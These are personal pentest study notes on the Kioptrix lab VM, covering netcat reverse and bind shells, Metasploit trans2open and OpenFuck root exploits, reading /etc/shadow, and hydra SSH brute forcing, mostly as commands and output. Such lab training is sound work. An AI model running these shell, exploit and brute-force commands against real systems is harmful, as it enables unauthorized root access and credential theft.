# Exploitation Basics

## Reverse Shells vs Bind Shells

### netcat

- reverse shell: a victim connects to us, we executes a linux bin shell when it connects, we're listening. 95% of cases.
- bind shell: we connect to a port on the target, the victim is listening. Uesful to bypass firewalls.

Reverse shell:

1. open a port: `nc -nvlp 4444`
2. `nc 192.168.92.128 4444 -e /bin/bash`

Bind shell:

1. `nc -nvlp 4444 -e /bin/bash`
2. connect to our victim: `nc 192.168.92.128 4444`

Note: `4444` is often blacklisted by antiviruses and firewalls.

## Staged vs Non-Staged Payloads

- non-staged payload: sends exploit shellcode all at once (large size, won't always work) (windows/meterpreter_reverse_tcp)
- staged payload: sends in stages (can be less stable), metasploit identifies them with an extra / (windows/meterpreter/reverse_tcp)

if one type is not working, try the other one.

## Gaining Root with Metasploit

1. run `msfconsole`
2. `search trans2open`, look for the targeted OS
3. `use 1`, then `options` to know which options to provide
4. `set rhosts 192.168.92.129`, then `options` again to check if it's set and `show targets`
5. type `run` or `exploit`, the payload is the issue, `options` again.
6. `set payload linux/x86/shell_reverse_tcp` with autocompletion to know our options, now it's a non-staged payload. `options` again to check if it's set.

we're in:

```
whoami
root
hostname
kioptrix.level1
```

## Manual Exploitation

With OpenFuck:

1. `git clone https://github.com/heltonWernik/OpenFuck.git && cd OpenFuck`
2. `apt install libssl-dev`
3. `gcc -o open OpenFuck.c -lcrypto`
4. `./open` to know the options you have to pass
5. `./open 0x6b 192.168.92.129 -c 40`, we know the type of machine thanks to our enumeration work, no port needed because we don't use ssl.

```
whoami
root
hostname
kioptrix.level1
```

Metasploit is more robust. OSCP certification exam doesn't allow Metasploit. Pen testers look for practicality.

- `sudo -l` to know our privileges.
- `cat /etc/passwd` to see passwords (only x placeholders, starting at 500 we have usernames: `john` and `harold`).
- `cat /etc/shadow` with hashes.

Post-exploitation: a new work of enumeration starts.

## Brute Force Attacks

### SSH

3 reasons to do that in an assessment:

1. test password strength
2. test if we can go in with a weak/default password
3. does the blue team catch us when brute forcing? (being loud sometimes to test the other team)

### hydra

- `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.92.129:22 -t 4 -V`, -V for verbosity, -t for threads.

### metasploit

- run `msfconsole`, then `search ssh`
- `use auxiliary/scanner/ssh/ssh_login` then `options`
- `set username root` and `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt` and `set rhosts 192.168.92.129` and `set threads 10` (would be detected super fast) and `set verbose true`.
- `run` or `exploit`

## Credential Stuffing and Password Spraying

## Our Notes, Revisited
